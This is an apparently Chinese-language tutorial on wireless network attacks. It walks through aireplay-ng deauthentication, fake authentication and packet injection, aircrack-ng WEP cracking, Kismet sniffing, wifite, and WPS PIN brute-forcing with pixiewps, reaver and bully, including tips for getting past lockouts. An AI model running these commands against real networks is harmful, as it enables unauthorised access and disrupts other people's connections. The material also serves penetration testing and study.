<p>参数说明：10表示发送次数（设置为0表示循环攻击，客户端无法正常上网）<br>-a设置ap的mac地址，-c设置已连接的合法客户端的mac地址(如果要-c则所有与ap连接的客户端全部断线）</p>
<h6 id="1-fakeauth-count-伪装一个客户端和ap进行连接"><a href="#1-fakeauth-count-伪装一个客户端和ap进行连接" class="headerlink" title="-1 fakeauth count 伪装一个客户端和ap进行连接"></a>-1 fakeauth count 伪装一个客户端和ap进行连接</h6><p>这是没有客户端研究学习的第一步，因为是没有合法连接的客户端，因此需要一个伪装客户端来和路由器连接。为让ap接受数据包，必须使自己的网卡和ap关联。-1伪装客户端连接成功够才能用发送注入命令<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -1 0 -e ap_essid -a ap_mac -h my_mac wifi0</span><br><span class="line">aireplay-ng -1 0 -e kifi -a &lt;AP MAC&gt; -h &lt;YOUR MAC&gt; &lt;interface&gt;</span><br><span class="line">aireplay-ng -1 60 -o 1 -q 10 -e &lt;ESSID&gt; -a &lt;AP MAC&gt; -h &lt;Your MAC&gt; &lt;interface&gt;</span><br></pre></td></tr></table></figure></p>
<p>参数说明：<br>0表示延迟0秒后连接；<br>-e设置ap_essid；<br>-a设置ap的mac地址<br>-h设置伪装客户端的网卡mac地址（就是自己网卡的mac地址）<br>-o 1 每次身份认证只发一组认证数据包<br>-q 10 每10秒发keep-live帧</p>
<p>排错：<br>某些AP验证客户端MAC地址OUI（前三个字节）——&gt;虚假客户端MAC<br>MAC地址过滤<br>Denied（Code 1）is WPA in use<br>    WPA/WPA2不支持Fake authentication<br>使用真实MAC地址<br>离信号太远<br>侦听信道不正确</p>
<h6 id="2-interactive-交互模式"><a href="#2-interactive-交互模式" class="headerlink" title="-2 interactive 交互模式"></a>-2 interactive 交互模式</h6><p>这个模式集合了抓包和提取数据，发包注入三种功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b ap_mac -h my_mac wifi0</span><br></pre></td></tr></table></figure>
<p>参数说明：<br>-p设置控制帧中包含的信息（16进制），默认采用0841；<br>-c：设置目标mac地址；<br>-b设置ap的mac地址；<br>-h伪装的客户端网卡mac地址（就是自己的mac地址）<br>提取包，发送注入数据包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -2 -r myarp -x 1024 wifi0</span><br></pre></td></tr></table></figure>
<p>参数说明：<br>myarp：自己设置的文件名；<br>-x1024：发包的速度（最大为1024）</p>
<h6 id="3-arp-request注入攻击模式"><a href="#3-arp-request注入攻击模式" class="headerlink" title="-3 arp-request注入攻击模式"></a>-3 arp-request注入攻击模式</h6><p>这种模式是一种抓包后分析重发的过程<br><code>aireplay-ng -3 -b ap_mac -h 合法客户端mac -x 512 wifi0</code></p>
<h6 id="4-chopchop攻击模式，用来获得一个包含密钥数据的xor文件"><a href="#4-chopchop攻击模式，用来获得一个包含密钥数据的xor文件" class="headerlink" title="-4 chopchop攻击模式，用来获得一个包含密钥数据的xor文件"></a>-4 chopchop攻击模式，用来获得一个包含密钥数据的xor文件</h6><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aireplay-ng -3 -b &lt;AP MAC&gt; -h &lt;Source MAC&gt; &lt;interface name&gt;</span><br><span class="line">aireplay-ng -4 -b ap-mac -h my_mac wifi0</span><br></pre></td></tr></table></figure>
<p>参数说明：<br>    -h 合法客户端/ 攻击者MAC<br>    aireplay-ng data 字段<br>    64bit密钥：25W<br>    128bit密钥：150W</p>
<h6 id="5-fragment-碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）"><a href="#5-fragment-碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）" class="headerlink" title="-5 fragment 碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）"></a>-5 fragment 碎片包攻击模式，用来获得PRGA（包含密钥的后缀为xor的文件）</h6><p><code>aireplay-ng -5 -b ap_mac -h my_mac wifi0</code><br>packetforge-ng 数据包制造程序</p>
<p><code>packetforge-ng -0 -a ap_mac -h my_mac wifi0 -k 255.255.255.255 -l255.255.255.255 -y niam_xor -w mrarp</code><br>参数说明：<br>-0：伪装arp数据包；<br>-k：设置目标文件ip和端口；<br>-l：设置源文件IP和端口；<br>-y：从xor文件中读取PRGA；<br>name：xor文件的名字；<br>-w设置伪装的arp包的文件名</p>
<p><code>aircrack-ng -n 64 -b ap_mac name-01.ivs</code><br>参数说明：<br>-n设置key长度（64/128/256/512）</p>
<h4 id="Kismet"><a href="#Kismet" class="headerlink" title="Kismet"></a>Kismet</h4><h5 id="参数说明-2"><a href="#参数说明-2" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Executing “kismet -h”</span><br><span class="line">usage: kismet [OPTION]</span><br><span class="line">Nearly all of these options are run-time overrides for values in the kismet.conf configuration file.  //几乎所有这些选项都是kismet.conf配置文件中值的运行时替代。</span><br><span class="line">Permanent changes should be made to.the configuration file. //应该对配置文件进行永久更改</span><br><span class="line"> *** Generic Options ***</span><br><span class="line"> -v, --version                Show version</span><br><span class="line">     --no-console-wrapper     Disable server console wrapper //禁用服务器控制台包装器</span><br><span class="line">     --no-ncurses-wrapper     Disable server console wrapper//禁用服务器控制台包装器</span><br><span class="line">     --debug                  Disable the console wrapper and the crash//禁用控制台包装和崩溃</span><br><span class="line">                              handling functions, for debugging//处理函数，用于调试</span><br><span class="line"> -f, --config-file &lt;file&gt;     Use alternate configuration file//使用备用配置文件</span><br><span class="line">     --no-line-wrap           Turn of linewrapping of output//使用备用配置文件</span><br><span class="line">                              (for grep, speed, etc)</span><br><span class="line"> -s, --silent                 Turn off stdout output after setup phase//使用备用配置文件</span><br><span class="line">     --daemonize              Spawn detached in the background//后面的卒子脱离了</span><br><span class="line">     --no-plugins             Do not load plugins//不要加载插件</span><br><span class="line">     --homedir &lt;path&gt;         Use an alternate path as the home //使用替代路径作为主路径</span><br><span class="line">                               directory instead of the user entry//目录而不是用户条目</span><br><span class="line">     --confdir &lt;path&gt;         Use an alternate path as the base //使用替代路径作为基准</span><br><span class="line">                               config directory instead of the default //目录而不是默认目录</span><br><span class="line">                               set at compile time//在编译时设置</span><br><span class="line">     --datadir &lt;path&gt;         Use an alternate path as the data//使用替代路径作为数据</span><br><span class="line">                               directory instead of the default set at //目录而不是默认设置为</span><br><span class="line">                               compile time.//编译时间。</span><br><span class="line"> *** Logging Options ***</span><br><span class="line"> -T, --log-types &lt;types&gt;      Override activated log types//重写激活的日志类型</span><br><span class="line"> -t, --log-title &lt;title&gt;      Override default log title//重写默认日志标题</span><br><span class="line"> -p, --log-prefix &lt;prefix&gt;    Directory to store log files//存储日志文件的目录</span><br><span class="line"> -n, --no-logging             Disable logging entirely//完全禁用日志记录</span><br><span class="line"></span><br><span class="line"> *** Device Tracking Options ***</span><br><span class="line">     --device-timeout=n       Expire devices after N seconds //N 秒后终止设备</span><br></pre></td></tr></table></figure>
<h5 id="使用说明-1"><a href="#使用说明-1" class="headerlink" title="使用说明"></a>使用说明</h5><h6 id="1、初始化"><a href="#1、初始化" class="headerlink" title="1、初始化"></a>1、初始化</h6><p><img data-src="https://img-blog.csdnimg.cn/20200323221327242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221720615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221839490.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221857943.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221916582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323221943381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img data-src="https://img-blog.csdnimg.cn/20200323222014995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img data-src="https://img-blog.csdnimg.cn/20200323222205273.png" alt="在这里插入图片描述"></p>
<h6 id="2、过程说明"><a href="#2、过程说明" class="headerlink" title="2、过程说明"></a>2、过程说明</h6><ol>
<li><p>无线网卡开启监听模式<br><code>airmon-ng  start wlan0</code>   网卡改变为监听状态，改名未wlan0mon<br>ps: wlan0 是我的笔记本无线网卡<br>查看自己的笔记本无线网卡是哪个的方法：<br>iwconfig：查看当前未监听状态以及监听状态的网卡名称。</p>
</li>
<li><p>修改默认配置文件（/etc/kismet/kismet.conf）</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># See the README for more information how to define sources; sources take the</span><br><span class="line"># form of:</span><br><span class="line"># source=interface:options</span><br><span class="line">#</span><br><span class="line"># For example to capture from a Wi-Fi interface in Linux you could specify:</span><br><span class="line"> source=wlan0mon</span><br><span class="line">#</span><br><span class="line"># or to specify a custom name,</span><br><span class="line"># source=ath9k</span><br><span class="line">#</span><br><span class="line"># Sources may be defined in the config file or on the command line via the </span><br><span class="line"># &apos;-c&apos; option.  Sources may also be defined live via the WebUI.</span><br><span class="line">#</span><br><span class="line"># Kismet does not pre-define any sources, permanent sources can be added here</span><br><span class="line"># or in kismet_site.conf</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>启动<br>sudo kismet<br>浏览器访问<br>然后就能看到嗅探到的信息了。</li>
</ol>
<p>通过 Kismet -s，不在输出终端下输出相关嗅探的ap信息。<br>默认嗅探到的信息都保存在当前执行命令的环境下目录下，后缀为kismet。</p>
<h6 id="3、捕获的信息查阅"><a href="#3、捕获的信息查阅" class="headerlink" title="3、捕获的信息查阅"></a>3、捕获的信息查阅</h6><ol>
<li>有些WLAN从安全方面考虑，隐藏了SSID或屏蔽SSID广播，这样做的话的确能够防止使用Netstumbler来扫描，但碰上Kismet就毫无办法了，在上图显示的绿色SSID均为被Kismet探测发现的隐藏SSID。我们点击第一个进入，可以看到下图所示详细信息。Name为发现的SSID名称，SSID：（Cloaked）为该SSID为隐藏。</li>
<li>当Kismet开始运行时，它将会显示这个区域内它找到的所有的无线局域网，“Name”那一列中所显示出来的内容就是AP的SSID，CH列显示频道，点击任意SSID可以看到BSSID（AP 的MAC地址），加密类型（无），设备厂家（cisco）信息。最下方是接入该AP的终端MAC，类型，使用频率（2.467GHz），网卡型号等信息。甚至当目标计算机已关闭时，Kismet也正可从我们的目标AP中检测到数据包，这是因为目标AP在不停地发出“beacons”。</li>
<li>在获知AP的上述信息后，再利用Airecrack等工具，就能实施破解，</li>
</ol>
<h4 id="wifite"><a href="#wifite" class="headerlink" title="wifite"></a>wifite</h4><p>相对于 Aircrack-ng 的使用更加容易，相当于吧 Aircrack-ng 的操作过程集成在一步完成。</p>
<ol>
<li>启动wifite。<br>直接输入 wifite<br>启动即扫描</li>
<li>等待扫描出你需要破解的wifi<br><img data-src="https://img-blog.csdnimg.cn/20200324113149498.png" alt="在这里插入图片描述"><br>CH：是指wifi的信道，这个请自行百度，新一代路由器都会自动分配最佳信道。<br>ENCR：是路由器的加密方式，有一种是WEP加密方式很好破解；<br>POWER：是无线信号强度；<br>WPS：是路由上的WPS开关是否开启，通常是纯数字，也开启的也很好破解；<br>CLIENT：是指监听到有多少客户端连接到路由，仅供参考。<br>BSSID代表路由器的 MAC 地址<br>AUTH 代表认证的方式<br>ESSID是WIFI的名字</li>
<li>ctrl+c 停止扫描<br>按照提示输入你的目标 wifi num数<br><img data-src="https://img-blog.csdnimg.cn/20200324115909812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2NjM3Mjc4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>然后开始进行扫描客户端，然后开始执行洪水攻击，监听流量抓包，抓到握手的包之后开始进行离线暴力破解。</li>
<li>暴力破解前自行决定是否更换密码字典。<br> wifite 的默认密码字典是 /usr/share/dict/wordlist-probable.txt<br> 字典内容格式是一行一个密码<br> 你可以选择网络搜集别人分享的密码字典，或者根据社会工程学利用crunch来生成对应的密码字典。</li>
<li>破解时间比较长，我用老电脑跑8位全数字密码字典大概5个多小时。后面研究下用GPU跑字典，时间  是不是短点。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] 1 attack completed:</span><br><span class="line">[+] 1/1 WEP attacks succeeded</span><br><span class="line">       cracked Test (14:E6:E4:AC:FB:20), key: &quot;6162636465&quot;</span><br><span class="line">[+] disabling monitor mode on mon0… done</span><br><span class="line">[+] quitting</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>从以上输出信息中，可以看到解密成功。其中，Test无线接入点的密码是6162636465。</p>
<h4 id="pixiewps"><a href="#pixiewps" class="headerlink" title="pixiewps"></a>pixiewps</h4><h5 id="参数说明-3"><a href="#参数说明-3" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; Executing “pixiewps -h”</span><br><span class="line"> Pixiewps 1.4 WPS pixie-dust attack tool</span><br><span class="line"> Copyright (c) 2015-2017, wiire &lt;wi7ire@gmail.com&gt;</span><br><span class="line"> Usage: pixiewps &lt;arguments&gt;</span><br><span class="line"> Required arguments: //必要参数</span><br><span class="line">   -e, --pke         : Enrollee public key  //注册会员公开密码匙</span><br><span class="line">   -r, --pkr         : Registrar public key //注册主任公开密码匙</span><br><span class="line">   -s, --e-hash1     : Enrollee hash-1 // 加入者hash值</span><br><span class="line">   -z, --e-hash2     : Enrollee hash-2</span><br><span class="line">   -a, --authkey     : Authentication session key //认证会话密钥</span><br><span class="line">   -n, --e-nonce     : Enrollee nonce //新登记</span><br><span class="line"> Optional arguments://可选参数:</span><br><span class="line">   -m, --r-nonce     : Registrar nonce//注册主任</span><br><span class="line">   -b, --e-bssid     : Enrollee BSSID</span><br><span class="line">   -v, --verbosity   : Verbosity level 1-3, 1 is quietest           [3] //详细程度1-3级，1级最安静</span><br><span class="line">   -o, --output      : Write output to file //将输出写入文件</span><br><span class="line">   -j, --jobs        : Number of parallel threads to use         [Auto] //使用的线程数</span><br><span class="line"></span><br><span class="line">   -h                : Display this usage screen //显示此用法帮助界面</span><br><span class="line">   --help            : Verbose help and more usage examples//详细帮助和更多的使用示例</span><br><span class="line">   -V, --version     : Display version//显示版本</span><br><span class="line"></span><br><span class="line">   --mode N[,... N]  : Mode selection, comma separated           [Auto] //模式选择，逗号分隔</span><br><span class="line">   --start [mm/]yyyy : Starting date             (only mode 3) [+1 day] //开始日期</span><br><span class="line">   --end   [mm/]yyyy : Ending date               (only mode 3) [-1 day] //结束日期</span><br><span class="line">   -f, --force       : Bruteforce full range     (only mode 3) //野兽力全射程</span><br><span class="line"> Miscellaneous arguments:  //其他参数:</span><br><span class="line">   -7, --m7-enc      : Recover encrypted settings from M7 (only mode 3)  //从 M7恢复加密设置</span><br><span class="line">   -5, --m5-enc      : Recover secret nonce from M5       (only mode 3)  //从 M5中恢复秘密</span><br><span class="line"></span><br><span class="line"> Example (use --help for more):</span><br><span class="line"> pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; -a &lt;authkey&gt; -n &lt;e-nonce&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--help example</span><br><span class="line"> Pixiewps 1.4 WPS pixie-dust attack tool</span><br><span class="line"> Copyright (c) 2015-2017, wiire &lt;wi7ire@gmail.com&gt;</span><br><span class="line"></span><br><span class="line"> Description of arguments:</span><br><span class="line"></span><br><span class="line"> -e, --pke</span><br><span class="line"></span><br><span class="line">     Enrollee&apos;s DH public key, found in M1.</span><br><span class="line"></span><br><span class="line"> -r, --pkr</span><br><span class="line"></span><br><span class="line">     Registrar&apos;s DH public key, found in M2.</span><br><span class="line"></span><br><span class="line"> -s, --e-hash1</span><br><span class="line"></span><br><span class="line">     Enrollee hash-1, found in M3. It&apos;s the hash of the first half of the PIN.</span><br><span class="line"></span><br><span class="line"> -z, --e-hash2</span><br><span class="line"></span><br><span class="line">     Enrollee hash-2, found in M3. It&apos;s the hash of the second half of the PIN.</span><br><span class="line"></span><br><span class="line"> -a, --authkey</span><br><span class="line"></span><br><span class="line">     Authentication session key. Although for this parameter a modified version of Reaver or Bully is needed, it can be avoided by specifying small Diffie-Hellman keys in both Reaver and Pixiewps and supplying --e-nonce, --r-nonce and --e-bssid.</span><br><span class="line"></span><br><span class="line"> [?] pixiewps -e &lt;pke&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; -S -n &lt;e-nonce&gt; -m &lt;r-nonce&gt; -b &lt;e-bssid&gt;</span><br><span class="line"></span><br><span class="line"> -n, --e-nonce</span><br><span class="line"></span><br><span class="line">     Enrollee&apos;s nonce, found in M1.</span><br><span class="line"></span><br><span class="line"> -m, --r-nonce</span><br><span class="line"></span><br><span class="line">     Registrar&apos;s nonce, found in M2. Used with other parameters to compute the session keys.</span><br><span class="line"></span><br><span class="line"> -b, --e-bssid</span><br><span class="line"></span><br><span class="line">     Enrollee&apos;s BSSID. Used with other parameters to compute the session keys.</span><br><span class="line"></span><br><span class="line"> -S, --dh-small (deprecated)</span><br><span class="line"></span><br><span class="line">     Small Diffie-Hellman keys. The same option must be specified in Reaver too. Some Access Points seem to be buggy and don&apos;t behave correctly with this option. Avoid using it with Reaver when possible</span><br><span class="line"></span><br><span class="line"> --mode N[,... N]</span><br><span class="line"></span><br><span class="line">     Select modes, comma separated (experimental modes are not used unless specified):</span><br><span class="line"></span><br><span class="line">         1 (RT/MT/CL)</span><br><span class="line">         2 (eCos simple)</span><br><span class="line">         3 (RTL819x)</span><br><span class="line">         4 (eCos simplest) [Experimental]</span><br><span class="line">         5 (eCos Knuth)    [Experimental]</span><br><span class="line"></span><br><span class="line"> --start [mm/]yyyy</span><br><span class="line"> --end   [mm/]yyyy</span><br><span class="line"></span><br><span class="line">     Starting and ending dates for mode 3. They are interchangeable. If only one is specified, the current time will be used for the other. The earliest possible date is 01/1970, corresponding to 0 (Unix epoch time), the latest is 02/2038, corresponding to 0x7FFFFFFF. If --force is used then pixiewps will start from the current time and go back all the way to 0.</span><br><span class="line"></span><br><span class="line"> -7, --m7-enc</span><br><span class="line"></span><br><span class="line">     Encrypted settings, found in M7. Recover Enrollee&apos;s WPA-PSK and secret nonce 2. This feature only works on some Access Points vulnerable to mode 3.</span><br><span class="line"></span><br><span class="line"> [?] pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -n &lt;e-nonce&gt; -m &lt;r-nonce&gt; -b &lt;e-bssid&gt; -7 &lt;enc7&gt; --mode 3</span><br><span class="line"></span><br><span class="line"> -5, --m5-enc</span><br><span class="line"></span><br><span class="line">     Encrypted settings, found in M5. Recover Enrollee&apos;s secret nonce 1. This option must be used in conjunction with --m7-enc. If --e-hash1 and --e-hash2 are also specified, pixiewps will also recover the WPS PIN.</span><br><span class="line"></span><br><span class="line"> [?] pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -n &lt;e-nonce&gt; -m &lt;r-nonce&gt; -b &lt;e-bssid&gt; -7 &lt;enc7&gt; -5 &lt;enc5&gt; --mode 3</span><br><span class="line"> [?] pixiewps -e &lt;pke&gt; -r &lt;pkr&gt; -n &lt;e-nonce&gt; -m &lt;r-nonce&gt; -b &lt;e-bssid&gt; -7 &lt;enc7&gt; -5 &lt;enc5&gt; -s &lt;e-hash1&gt; -z &lt;e-hash2&gt; --mode 3</span><br></pre></td></tr></table></figure>
<h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h5><p>顾名思义，就是针对wps连接的wifi进行攻击，但是现在懂wps连接的又有几个呢，然后又费事的用wps连接的又有几个呢，所以就没大用咯。</p>
<p>只适用于固定厂商的芯片，成功率很低<br>很多厂家实现了锁定机制，所以爆破时应注意限速<br>一旦触发锁定，可尝试耗尽AP连接数，令其重启并解除WPS锁定</p>
<p>开源地址：<a href="https://github.com/wiire-a/pixiewps" target="_blank" rel="noopener">https://github.com/wiire-a/pixiewps</a><br>国内镜像：<a href="https://gitee.com/lhc0101/pixiewps" target="_blank" rel="noopener">https://gitee.com/lhc0101/pixiewps</a></p>
<h5 id="使用说明-2"><a href="#使用说明-2" class="headerlink" title="使用说明"></a>使用说明</h5><p>首先确保你的无线网卡能工作，进入monitor模式<br><code>airmon-ng start wlan0</code></p>
<p>使用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wash -C -i wlan0mon </span><br><span class="line">airodump-ng wlan0mon --wps</span><br></pre></td></tr></table></figure></p>
<p>来扫描开WPS的AP ctrl+c停止</p>
<p>使用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv </span><br><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -K 1</span><br></pre></td></tr></table></figure></p>
<p>想要攻击的AP’MAC地址 -v  -K 1<br>如果存在该漏洞的话，很快就能出pin和密码了</p>
<p>得到pin码子：如888888<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reaver -i wlan0mon -b &lt;AP mac&gt; -vv -p 88888888</span><br></pre></td></tr></table></figure></p>
<p>得到密码</p>
<p>如果确实有这方面的漏洞，秒破～</p>
<h4 id="reaver"><a href="#reaver" class="headerlink" title="reaver"></a>reaver</h4><h5 id="参数说明-4"><a href="#参数说明-4" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-i  无线网卡名称</span><br><span class="line">-b  目标AP的mac地址</span><br><span class="line">-a  自动检测目标AP最佳配置</span><br><span class="line">-S  使用最小的DH key，可以提高破解速度</span><br><span class="line">-vv  显示更多的非严重警告（注意这是 2 个小写字母 v）</span><br><span class="line">-d  即delay每穷举一次的闲置时间 预设为1秒</span><br><span class="line">-c  信道编号</span><br><span class="line">-p  PIN码四位或八位  //可以用8位直接找到密码。</span><br></pre></td></tr></table></figure>
<h5 id="使用说明-3"><a href="#使用说明-3" class="headerlink" title="使用说明"></a>使用说明</h5><p>同上一个功能</p>
<ol>
<li>同上先开启无线网卡监听<br><code>airmon-ng  start  wlan0</code></li>
<li>然后附近 WLAN 网络<br><code>airodump-ng  wlan0mon</code></li>
<li>找出开启了 WPS 功能、可以使用 PIN码 登录的路由器，并另外记录下该 AP 的 BSSID（约等于该 AP 的 MAC 地址）：<br><code>wash  -i  wlan0mon</code></li>
<li>开始进行 PIN码 穷举破解（注意末尾的参数是 2 个小写字母 v）：<br><code>reaver -i wlan0mon -b xx:xx:xx:xx:xx:xx -vv</code><br><code>reaver -i wlan0mon -b D8:15:0D:D6:13:92 -a -S -d9 -t9 -vv</code> -d9 -t9时间间隔，防止挂掉</li>
<li>等待破解完成，这期间可以查看到穷举破解花费的时间、预计剩余时间、穷举PIN码进度等信息</li>
<li>破解完成后，查看并记录下 PIN码 和 密码，获取到 PIN码 后，以后即便路由器更换了密码，也可以很迅速地通过 PIN码 重新获得新密码。举例：<br> <code>reaver  -i  wlan0mon -b  xx:xx:xx:xx:xx:xx  -p 12316977</code></li>
<li>最后，结束无线网卡的监控模式。</li>
</ol>
<h4 id="bully"><a href="#bully" class="headerlink" title="bully"></a>bully</h4><p>是 WPS 穷举法的一个新实现，用 c 语言编写。 它在概念上与其他程序相同，因为它利用了 WPS 规范中的(现在众所周知的)设计缺陷。 与原始的 reaver 代码相比，它有几个优点。 其中包括减少依赖项、改进内存和 cpu 性能、正确处理 endianness 以及更健壮的选项集。 它运行在 Linux 上，并且是专门为在嵌入式 Linux 系统(OpenWrt 等)上运行而开发的，无论其体系结构如何。</p>
<p>开源地址：<a href="https://gitlab.com/kalilinux/packages/bully/" target="_blank" rel="noopener">https://gitlab.com/kalilinux/packages/bully/</a></p>
<h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><h5 id="参数说明-5"><a href="#参数说明-5" class="headerlink" title="参数说明"></a>参数说明</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usage: bully \ interface</span><br><span class="line">Required arguments:</span><br><span class="line">  interface      : Wireless interface in monitor mode (root required)</span><br><span class="line">  -b, --bssid macaddr    : MAC address of the target access point</span><br><span class="line">Or</span><br><span class="line">  -e, --essid string     : Extended SSID for the access point</span><br><span class="line">Optional arguments:</span><br><span class="line">  -c, --channel N[,N...] : Channel number of AP, or list to hop [b/g]</span><br><span class="line">  -i, --index N          : Starting pin index (7 or 8 digits)  [Auto]</span><br><span class="line">  -l, --lockwait N       : Seconds to wait if the AP locks WPS   [43]</span><br><span class="line">  -o, --outfile file     : Output file for messages          [stdout]</span><br><span class="line">  -p, --pin N            : Starting pin number (7 or 8 digits) [Auto]</span><br><span class="line">  -s, --source macaddr   : Source (hardware) MAC address      [Probe]</span><br><span class="line">  -u, --lua              : Lua script file</span><br><span class="line">  -v, --verbosity N      : Verbosity level 1-3, 1 is quietest     [3]</span><br><span class="line">  -w, --workdir path     : Location of pin/session files  [~/.bully/]</span><br><span class="line">  -5, --5ghz             : Hop on 5GHz a/n default channel list  [No]</span><br><span class="line">  -B, --bruteforce       : Bruteforce the WPS pin checksum digit [No]</span><br><span class="line">  -F, --force            : Force continue in spite of warnings   [No]</span><br><span class="line">  -S, --sequential       : Sequential pins (do not randomize)    [No]</span><br><span class="line">  -T, --test             : Test mode (do not inject any packets) [No]</span><br><span class="line">Advanced arguments:</span><br><span class="line">  -d, --pixiewps         : Attempt to use pixiewps               [No]</span><br><span class="line">  -g, --genpin N         : Pin Generator [1] D-Link [2] Belkin    [0]</span><br><span class="line">  -a, --acktime N        : Deprecated/ignored                  [Auto]</span><br><span class="line">  -r, --retries N        : Resend packets N times when not acked  [2]</span><br><span class="line">  -m, --m13time N        : Deprecated/ignored                  [Auto]</span><br><span class="line">  -t, --timeout N        : Deprecated/ignored                  [Auto]</span><br><span class="line">  -1, --pin1delay M[,N]  : Delay M seconds every Nth nack at M5 [0,1]</span><br><span class="line">  -2, --pin2delay M[,N]  : Delay M seconds every Nth nack at M7 [5,1]</span><br><span class="line">  -A, --noacks           : Disable ACK check for sent packets    [No]</span><br><span class="line">  -C, --nocheck          : Skip CRC/FCS validation (performance) [No]</span><br><span class="line">  -D, --detectlock       : Detect WPS lockouts unreported by AP  [No]</span><br><span class="line">  -E, --eapfail          : EAP Failure terminate every exchange  [No]</span><br><span class="line">  -L, --lockignore       : Ignore WPS locks reported by the AP   [No]</span><br><span class="line">  -M, --m57nack          : M5/M7 timeouts treated as WSC_NACK&apos;s  [No]</span><br><span class="line">  -N, --nofcs            : Packets don&apos;t contain the FCS field [Auto]</span><br><span class="line">  -P, --probe            : Use probe request for nonbeaconing AP [No]</span><br><span class="line">  -Q, --wpsinfo          : Use probe request to gather WPS info  [No]</span><br><span class="line">  -R, --radiotap         : Assume radiotap headers are present [Auto]</span><br><span class="line">  -W, --windows7         : Masquerade as a Windows 7 registrar   [No]</span><br><span class="line">  -Z, --suppress         : Suppress packet throttling algorithm  [No]</span><br><span class="line">  -V, --version          : Print version info and exit</span><br><span class="line">  -h, --help             : Display this help information</span><br></pre></td></tr></table></figure>
<h5 id="参数详细介绍"><a href="#参数详细介绍" class="headerlink" title="参数详细介绍"></a>参数详细介绍</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> -c, --channel N[,N...]</span><br><span class="line"></span><br><span class="line">Channel number, or comma separated list of channels to hop on. Some AP&apos;s will switch</span><br><span class="line">channels periodically. This option allows bully to reacquire an AP and continue an attack</span><br><span class="line">without intervention. Note that using channel hopping will typically slow an attack,</span><br><span class="line">especially when the AP&apos;s signal is weak, because time is spent scanning channels instead</span><br><span class="line">of testing pins. If no channel is provided, bully will hop on all channels.</span><br><span class="line"></span><br><span class="line"> -i, --index N</span><br><span class="line"></span><br><span class="line">This is the index of the starting pin number in the randomized pin file. This option is</span><br><span class="line">not valid when running bully in sequential pin search mode.  This is typically handled</span><br><span class="line">for you automatically, i.e. an interrupted session will resume after the last pin that</span><br><span class="line">was successfully tested. Note that when less than 7 digits (8 digits if -B is active) are</span><br><span class="line">given, zeroes are padded on the left.</span><br><span class="line"></span><br><span class="line"> -l, --lockwait N</span><br><span class="line"></span><br><span class="line">Number of seconds to wait when an AP locks WPS. Most AP&apos;s will lock out for 5 minutes, so</span><br><span class="line">the default value is 43 